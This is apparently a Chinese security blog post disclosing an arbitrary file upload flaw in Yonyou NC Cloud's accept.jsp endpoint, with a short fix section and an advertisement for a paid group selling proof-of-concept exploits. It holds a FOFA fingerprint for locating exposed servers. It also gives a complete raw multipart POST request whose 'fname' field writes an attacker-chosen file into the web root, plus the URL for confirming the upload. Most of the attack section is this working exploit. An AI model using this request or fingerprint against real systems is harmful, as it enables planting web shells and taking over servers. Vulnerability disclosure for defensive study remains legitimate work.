#  用友NC Cloud accept.jsp接口存在任意文件上传漏洞  
原创 北雪网络安全
                    北雪网络安全  北雪网络安全   2026-09-12 01:21  
  
**本文章所描述的内容仅供网络安全学习使用，任何人不允许学到技术内容进行非法系统测试，作者不对任何学习文章并进行非法操作的行为负责，由本人自己承担后果，本文章仅供技术学习。**  
  
01  
  
更多内容  
  
#### 网络安全学习知识库每日添加最新漏洞并提供python与 nuclei 批量探测脚本：https://pc.fenchuan8.com/#/index?forum=110296  
  
  
02  
  
搜索引擎  
  
  
fofa  
：  
icon_hash="1085941792"  
  
  
  
03  
  
漏洞复现  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/d7u6ib4OKSzjhzTgAhxxvL85bNRx8XyTzx2KXhMPeGSeCNmpvTgZpX0egJsWRObOP610Fb2MrsBJjuISUWCgS8qJSDOsFVAvpTJ3Ne4qmOxc/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/d7u6ib4OKSzgSEFFXVLiaZ6nnpdSB5Th1ZzB5g6VQfTl5pGh5qvrhib6zKSf6Veu3820oMYkd94cOsoPxVjupiauia3PAK8tOuR6sP15bpxKrkvg/640?wx_fmt=png&from=appmsg "")  
  
```
POST /aim/equipmap/accept.jsp HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Content-Length: 293
Content-Type: multipart/form-data; boundary=ac1485f11aa5441defff4ab45b7fb177

--ac1485f11aa5441defff4ab45b7fb177
Content-Disposition: form-data; name="upload"; filename="01356.txt"
Content-Type: text/plain

875784047
--ac1485f11aa5441defff4ab45b7fb177
Content-Disposition: form-data; name="fname"

\webapps\nc_web\01356.txt
--ac1485f11aa5441defff4ab45b7fb177--
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/d7u6ib4OKSzhpxswDxNIHXFkE03X4cOH8DicT5zwP7ZhTicqI8SB0GUwyxY4eFwnDlicTMCyZBjD93ibRGgmGpiaVA0vKCiaHwhA8thGye2KOUszZw/640?wx_fmt=png&from=appmsg "")  
  
上传后，拼接路径：  
http://127.0.0.1/01356.txt  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/d7u6ib4OKSzgZpLx42I1HUSkSyWglLwG6TibovQJqQGZxQv7JM6EniaEn9yVoicIicbibLtwQNZKLsZhqP2WDV9lHcquGc5XTuM3I6HliaW1nWoe4A/640?wx_fmt=png&from=appmsg "")  
  
  
      
  
04  
  
修复建议  
  
1、关闭互联网暴露面或接口设置访问权限  
  
2、升级至安全版本  
  
05  
  
内部圈子  
  
🛠️   
【知名漏洞实战圈，纯干货】  
🛠️  
  
还在找公开漏洞POC而烦恼？还在为漏洞不会验证而发愁？还在为发现不了漏洞而自卑？这里漏洞圈子解决你的困惑！  
目前已更新poc数量2500+  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/d7u6ib4OKSzjMKM4PywXDyJ0vWrnlrn3KbsUibs5xEU3PxylJaGia2DQDrxibbzJHhNM8um7dzEGVcG4ibl6xMUdwqGl4Hf4dp46Rv55xGhNMFRc/640?wx_fmt=png&from=appmsg "")  
  
  
🎯 适用场景  
  
**▫️渗透测试▫️企业漏洞自查▫️攻防演练▫️安全服务▫️合规运营**  
  
****  
  
**▫️微信扫一扫进入付费圈子查看更多漏洞内容。**  
  
**▫️全民掌握网安技能，共守智能时代晴空。**  
  
  
  
  
  
